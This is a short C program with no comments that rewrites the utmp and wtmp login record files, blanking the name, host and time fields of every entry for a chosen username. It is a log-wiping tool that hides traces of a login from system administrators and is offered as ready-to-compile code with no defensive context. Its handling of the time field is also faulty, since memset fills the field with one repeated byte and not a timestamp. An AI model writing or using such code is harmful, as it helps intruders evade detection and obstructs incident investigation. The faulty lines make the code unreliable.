#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <utmp.h>
#include <unistd.h>
#include <time.h>

int dead (char *name_file, char *name_arg){
  struct utmp pos;
  time_t timer;
  timer = time(NULL);
  int fd, dist;
  dist = sizeof(struct utmp);
  
  if((fd=open(name_file, O_RDWR)) < 0){
    fputs("Error opening file.\n", stderr);
    return(-1);
  }
  
  while(read(fd, &pos, dist) == dist){
    if(!strncmp(pos.ut_name, name_arg, sizeof(pos.ut_name))){
      memset(&pos.ut_time, timer, sizeof(pos.ut_time));
      memset(&pos.ut_name, 0, sizeof(pos.ut_name));
      memset(&pos.ut_host, 0, sizeof(pos.ut_host));
      if(lseek(fd, -dist, SEEK_CUR) != -1)
        write(fd, &pos, dist);
    }
  }
  close(fd);
}

int main(int argc, char **argv){
  if(argc != 2) return(1);
  dead(_PATH_UTMP, argv[1]);
  dead(_PATH_WTMP, argv[1]);
  return 0;
}
